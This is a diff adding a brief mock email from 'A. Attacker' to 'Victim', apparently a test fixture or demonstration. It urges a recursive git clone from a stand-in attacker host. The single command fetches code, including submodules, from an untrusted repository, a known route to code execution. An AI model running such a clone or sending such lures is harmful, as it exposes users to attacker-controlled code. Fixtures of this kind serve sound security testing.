@@ -1,0 +1,12 @@
+Hi there Victim,
+
+Check out this codebase. I know you'll find some juicy bugs!
+
+  git clone --recursive http://attacker/totally_not_malicious.git
+
+
+Cheers,
+
+--
+A. Attacker
+
